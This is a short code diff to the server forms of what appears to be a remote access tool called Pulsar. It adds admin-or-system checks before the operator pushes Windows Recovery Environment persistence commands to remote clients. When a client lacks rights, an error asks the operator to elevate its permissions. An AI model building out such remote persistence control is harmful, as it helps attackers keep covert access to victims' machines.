@@ -614,7 +614,12 @@ namespace Pulsar.Server.Forms
                         });
                         break;
                     case "WinRE":
-                        client.Send(new DoAddWinREPersistence { });
+                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
+                        {
+                            client.Send(new DoAddWinREPersistence());
+                        }
+                        break;
+                    default:
                         break;
                 }
             }
@@ -1118,7 +1123,16 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoAddWinREPersistence());
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    c.Send(new DoAddWinREPersistence());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
             }
         }
 
@@ -1126,7 +1140,16 @@ namespace Pulsar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                c.Send(new DoRemoveWinREPersistence());
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    c.Send(new DoRemoveWinREPersistence());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
             }
         }
 
